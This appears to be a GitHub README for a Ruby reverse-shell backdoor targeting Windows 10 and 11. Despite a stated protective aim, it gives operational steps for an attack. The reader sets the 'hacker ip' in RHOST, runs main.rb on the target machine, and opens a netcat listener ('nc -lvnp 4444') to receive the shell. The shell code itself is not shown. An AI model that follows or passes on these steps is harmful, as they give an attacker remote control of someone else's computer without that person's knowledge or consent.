# 🦑 shell-reverse-windows
 
![GitHub repo size](https://img.shields.io/github/repo-size/DioBruh/backdoor-windows?style=for-the-badge)
![GitHub language count](https://img.shields.io/github/languages/count/DioBruh/backdoor-windows?style=for-the-badge)
![GitHub forks](https://img.shields.io/github/forks/DioBruh/backdoor-windows?style=for-the-badge)
![Bitbucket open issues](https://img.shields.io/bitbucket/issues/DioBruh/backdoor-windows?style=for-the-badge)
![Bitbucket open pull requests](https://img.shields.io/bitbucket/pr-raw/DioBruh/backdoor-windows?style=for-the-badge)
 
<p>
  <img src="https://i.pinimg.com/originals/8d/bb/fc/8dbbfcd986821d26a8c09ace36045c0f.png"width=300px>
</p>

<p>
  <img src="https://camo.githubusercontent.com/7f611eb7fa49f2b2cf006f5164f75e1b4fafd3d967bfe0b00b717d3a10ebd44d/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f527562792d4343333432443f7374796c653d666f722d7468652d6261646765266c6f676f3d72756279266c6f676f436f6c6f723d7768697465"
</p>

> A simple ruby reverse-shell windows 10, 11
  
My goal with this is not to black hat and throw around something that will screw someone is literally the opposite is to help you protect yourself 

## 💻 Requirements
* Latest `Ruby` version.
  
## ☕ Using
`Clone` the repository using:

```
git clone https://github.com/DioBruh/backdoor-windows
```

<span>Export attacker ip in <a href="https://github.com/DioBruh/backdoor-windows/blob/main/main.rb">main.rb</a></span>

```ruby
RHOST = '' # Hacker ip.
```

<span>If you don't know your ip, use:"</span>

```powershell
ifconfig
```
  
<p>
  <img src="https://github.com/DioBruh/reverse-shell/blob/main/images/ifconfig.png" width="600px;">
</p>

## 💻 Init

* Init `archive` <a href="https://github.com/DioBruh/backdoor-windows/blob/main/main.rb">main.rb</a> on target machine.<br>
* Start a `listen` on your pc listening to port 4444 with the command ```nc -lvnp 4444```
* Wait for `connection`.

## 🤝 Contributors.
<table>
    <td align="center">
      <a href="https://github.com/DioBruh/">
        <img src="https://avatars.githubusercontent.com/u/87872423?v=4" width="100px;" alt="Foto do DIO"/><br>
        <sub>
          <b>Dio Brando</b>
        </sub>
      </a>
    </td>
  </tr>
</table>
